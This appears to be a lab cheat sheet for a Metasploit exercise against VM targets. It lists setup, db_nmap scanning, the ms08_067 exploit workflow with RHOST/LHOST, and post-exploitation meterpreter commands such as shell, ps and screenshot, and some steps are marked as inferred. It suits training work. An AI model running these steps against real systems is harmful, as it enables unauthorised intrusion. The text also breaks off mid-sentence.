#####Set VM network to Bridged for Kali and target VMs (GUI: Player → Manage → Virtual Machine Settings → Network Adapter → Bridged). (PDF instructs this; no single command). 



Start PostgreSQL:

sudo systemctl start postgresql.service                  # (from PDF)
# optionally: sudo systemctl enable postgresql.service


########Initialize Metasploit DB (recommended inference — PDF references DB init but exact line omitted):

sudo msfdb init                                         # (recommended; PDF references db init)


####Start Metasploit console:

sudo msfconsole                                         # (from PDF)


####Use db_nmap from msfconsole to import scan results:

# inside msfconsole prompt:
db_nmap <target-ip>                                     # (from PDF)
services                                                # list services (from PDF)


#######Search for an exploit (example given in PDF):

search ms08_067                                         # (from PDF example)
info exploit/windows/some/path                          # use info to read exploit details (recommended)


######Set exploit options and run exploit (example pattern):

set RHOST <target-ip>
set LHOST <your-attacker-ip>
set RPORT <port-if-required>
exploit                                                 # launch exploit


#########Post-exploit / meterpreter commands (from PDF):

shell                                                   # drop to target shell (from PDF)
ipconfig                                                # run on target shell (from PDF)
dir                                                     # list directories (from PDF)
ps                                                      # list processes (from PDF)
screenshot                                              # take screenshot (meterpreter) (from PDF)
exit                                                    # exit shell/meterpreter (from PDF)


To save scan outputs (as PDF described): use -oN or Metasploit saved folder (msf4 local). Example:

# outside msfconsole:
db_nmap -oN msf_scan.txt <target-ip>                    # recommended
# inside msfconsole, saved results go to ~/.msf4/loot or /root/.msf4/local/ (PDF men
